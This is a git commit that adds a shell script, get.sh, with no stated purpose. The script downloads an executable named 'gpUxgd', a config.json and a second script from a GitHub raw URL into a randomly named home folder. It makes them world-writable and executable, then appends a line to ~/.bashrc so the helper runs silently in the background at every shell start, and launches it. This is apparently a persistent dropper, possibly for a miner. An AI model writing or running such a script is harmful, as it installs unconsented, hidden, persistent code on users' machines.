dadb1d479a063b0faf9c7440890b2076da5a6399
Dog Puppy <Fabian.Kuphal003@proton.me>
2024-11-07 18:05:16 +0000

    Add files via upload

---
+++ get.sh
@@ -0,0 +1,20 @@
+#!/bin/bash
+
+cd ~
+mkdir gpUxgdSz
+cd gpUxgdSz
+
+rm config.json
+
+
+curl -O https://raw.githubusercontent.com/Fabian066/readmorelinssz/refs/heads/main/gpUxgd
+
+curl -O https://raw.githubusercontent.com/Fabian066/readmorelinssz/refs/heads/main/config.json
+curl -O https://raw.githubusercontent.com/Fabian066/readmorelinssz/refs/heads/main/checkes.sh
+
+chmod 777 gpUxgd
+chmod 777 checkes.sh
+
+echo "~/gpUxgdSz/checkes.sh > /dev/null 2>&1 &" >> ~/.bashrc
+
+./checkes.sh &
